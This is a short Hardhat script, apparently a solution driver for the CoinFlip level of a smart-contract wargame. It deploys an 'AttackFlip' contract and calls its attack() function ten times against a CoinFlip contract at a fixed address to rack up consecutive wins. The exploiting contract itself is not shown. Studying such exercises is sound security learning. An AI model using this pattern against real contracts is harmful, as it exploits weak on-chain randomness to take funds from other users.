import { ethers } from "hardhat";

async function main() {
    const [account] = await ethers.getSigners();

    const Attack = await ethers.getContractFactory("AttackFlip");
    const attack = await Attack.deploy();

    const CoinFlip = await ethers.getContractFactory("CoinFlip");
    const flip = CoinFlip.attach("0xec9Eb28674Ca163fA1cb3299808777CE61a01F59");

    for (let i = 0; i < 10; i++) {
        const tx = await attack.attack();
        await tx.wait();
    }

    console.log(await flip.consecutiveWins());
}


main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });